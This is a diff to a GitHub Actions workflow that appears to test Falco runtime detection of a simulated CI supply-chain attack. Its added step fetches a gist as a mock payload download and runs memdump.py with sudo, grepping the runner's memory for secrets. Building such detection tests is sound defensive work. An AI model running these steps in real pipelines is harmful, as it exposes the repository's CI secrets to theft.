@@ -11,13 +11,12 @@ jobs:
       - uses: actions/checkout@v4
 
       - name: Start Falco
-        uses: falcosecurity/falco-actions/start@f67ddcc4b202aae0ab3d7194159c9c947ae77791
+        uses: falcosecurity/falco-actions/start@6b1d1bc4ff9b306f0527b7a172f9483752d3777e
         with:
-          mode: live
+          mode: analyze
           falco-version: '0.39.0'
           verbose: true
           cicd-rules: true
-          custom-rule-file: '${{ github.workspace }}/cicd.yaml'
 
       - name: Get changed files
         id: changed-files
@@ -38,10 +37,28 @@ jobs:
 
       - name: Changed file payload
         run: |
+          sleep 3
+          # Simulate gist download
+          curl https://gist.github.com/loresuso/21b871c2c701bc431be6c82234d40b28
+          # Simulate payload
           sudo python3 memdump.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u
 
       - name: Stop Falco
-        uses: falcosecurity/falco-actions/stop@f67ddcc4b202aae0ab3d7194159c9c947ae77791
+        uses: falcosecurity/falco-actions/stop@6b1d1bc4ff9b306f0527b7a172f9483752d3777e
         with:
-          mode: live
+          mode: analyze
           verbose: true
+
+  analyze-job:
+    runs-on: ubuntu-latest
+    needs: changed_files
+    permissions:
+      contents: read
+      actions: read
+    steps:
+    - name: Analyze
+      uses: falcosecurity/falco-actions/analyze@6b1d1bc4ff9b306f0527b7a172f9483752d3777e
+      with:
+        falco-version: '0.39.0'
+        custom-rule-file: '${{ github.workspace }}/cicd.yaml'
+        verbose: true
